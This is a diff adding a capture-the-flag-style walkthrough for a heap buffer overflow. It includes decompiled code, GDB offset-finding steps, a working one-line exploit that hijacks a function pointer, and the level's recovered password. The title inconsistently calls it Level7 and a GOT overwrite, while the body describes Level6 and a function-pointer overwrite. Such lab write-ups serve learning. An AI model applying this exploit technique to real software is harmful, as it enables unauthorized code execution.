@@ -1,0 +1,95 @@
+# Level7 Walkthrough - Heap Buffer Overflow with GOT Overwrite
+
+## Overview
+Level6 is a classic buffer overflow challenge where we need to overwrite a function pointer to redirect execution to a different function.
+
+## Code Analysis
+
+The vulnerable program has two key functions:
+
+```c
+void n(void) {
+    system("/bin/cat /home/user/level7/.pass");  // This is what we want to execute
+    return;
+}
+
+void main(undefined4 param_1, int param_2) {
+    char *__dest;
+    undefined4 *puVar1;
+    
+    __dest = (char *)malloc(0x40);        // Allocate 64 bytes for buffer
+    puVar1 = (undefined4 *)malloc(4);     // Allocate 4 bytes for function pointer
+    *puVar1 = m;                          // Set function pointer to function 'm'
+    strcpy(__dest, *(char **)(param_2 + 4)); // VULNERABLE: No bounds checking!
+    (*(code *)*puVar1)();                 // Call the function pointed to by puVar1
+    return;
+}
+```
+
+## The Vulnerability
+
+The `strcpy()` call copies user input into a 64-byte buffer without bounds checking. This allows us to overflow the buffer and overwrite the function pointer.
+
+## Exploitation Steps
+
+### Step 1: Find Function Addresses
+Using GDB with peda:
+```bash
+gdb -q /home/user/level6/level6
+source /tmp/peda/peda.py
+info functions
+```
+
+Key addresses:
+- Function `n`: `0x08048454` (our target)
+- Function `m`: `0x08048468` (default function)
+
+### Step 2: Find the Offset
+Create a pattern to find exactly where the function pointer gets overwritten:
+
+```bash
+pattern create 100
+run 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+```
+
+The program crashes trying to execute `0x65414149` (`'IAAe'`).
+
+Find the offset:
+```bash
+pattern offset IAAe
+# Result: IAAe found at offset: 72
+```
+
+### Step 3: Craft the Exploit
+We need:
+- 72 bytes of padding to reach the function pointer
+- Address of function `n` in little-endian format: `\x54\x84\x04\x08`
+
+### Step 4: Execute the Exploit
+```bash
+/home/user/level6/level6 $(python -c "print('A' * 72 + '\x54\x84\x04\x08')")
+```
+
+## Memory Layout Explanation
+
+```
+Heap Layout:
+[64-byte buffer] [8 bytes padding/metadata] [4-byte function pointer]
+[    __dest    ] [      heap overhead     ] [      *puVar1        ]
+```
+
+The 72-byte offset accounts for:
+- 64 bytes: The allocated buffer size
+- 8 bytes: Heap metadata/alignment padding
+- Total: 72 bytes to reach the function pointer
+
+## Result
+The exploit successfully overwrites the function pointer, causing the program to call function `n()` instead of `m()`, which executes the system command and reveals the level7 password:
+
+**Level7 Password:** `f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`
+
+## Key Concepts
+- **Buffer Overflow**: Overwriting memory beyond allocated boundaries
+- **Function Pointer Hijacking**: Redirecting program execution by overwriting function pointers
+- **Heap Layout**: Understanding how malloc allocates memory and heap metadata
+- **Little-Endian Format**: x86 architecture stores multi-byte values with least significant byte first
